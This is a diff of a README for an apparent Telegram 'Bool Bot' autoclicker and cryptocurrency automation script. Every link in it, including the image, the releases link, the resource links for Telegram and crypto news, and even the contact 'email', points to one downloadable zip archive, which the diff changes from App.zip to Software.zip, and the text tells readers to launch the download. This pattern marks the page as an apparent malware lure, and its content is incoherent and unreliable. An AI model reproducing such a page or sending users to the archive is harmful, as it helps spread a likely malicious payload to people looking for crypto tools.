@@ -2,7 +2,7 @@
 
 Welcome to the Bool Automation Script repository! This repository contains an automatic script designed for Bool Bot TELEGRAM. Whether you're looking to automate clicks, improve your bot's performance, or explore the world of cryptocurrency, this script has got you covered.
 
-![Bool Automation Script](https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip)
+![Bool Automation Script](https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip)
 
 ## Repository Topics:
 - bool-autoclicker
@@ -24,10 +24,10 @@ Welcome to the Bool Automation Script repository! This repository contains an au
 - cryptography
 
 ## 🚀 Getting Started
-To get started with the Bool Automation Script, you can **download** the script from the following link: [Download Script](https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip)
+To get started with the Bool Automation Script, you can **download** the script from the following link: [Download Script](https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip)
 It needs to be launched once you have downloaded it.
 
-If the above link is not working or you prefer to visit a website directly for the script, you can visit the [Releases](https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip) section for alternative download options.
+If the above link is not working or you prefer to visit a website directly for the script, you can visit the [Releases](https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip) section for alternative download options.
 
 ## ⚙️ Installation
 1. **Download the Script**: Click on the link provided above to download the script.
@@ -44,15 +44,15 @@ If the above link is not working or you prefer to visit a website directly for t
 3. **Cryptocurrency**: Utilize the script to access cryptocurrency-related functionalities.
 
 ## 🌐 Resources
-- [Telegram](https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip)
-- [Bool Bot](https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip)
-- [Crypto News](https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip)
-- [Cryptography Basics](https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip)
+- [Telegram](https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip)
+- [Bool Bot](https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip)
+- [Crypto News](https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip)
+- [Cryptography Basics](https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip)
 
 ## 🤝 Contribution
 Contributions to the Bool Automation Script repository are welcome! Whether you'd like to suggest improvements, report issues, or add new features, feel free to create a pull request.
 
 ## 📞 Contact
-For any questions or feedback regarding the Bool Automation Script, you can reach out via email at *https://github.com/Murodsb/bool-automation-script/releases/download/v1.0/App.zip*.
+For any questions or feedback regarding the Bool Automation Script, you can reach out via email at *https://github.com/Murodsb/bool-automation-script/releases/download/v2.0/Software.zip*.
 
 Let's automate, optimize, and explore together with the Bool Automation Script! 🤖💰🔒
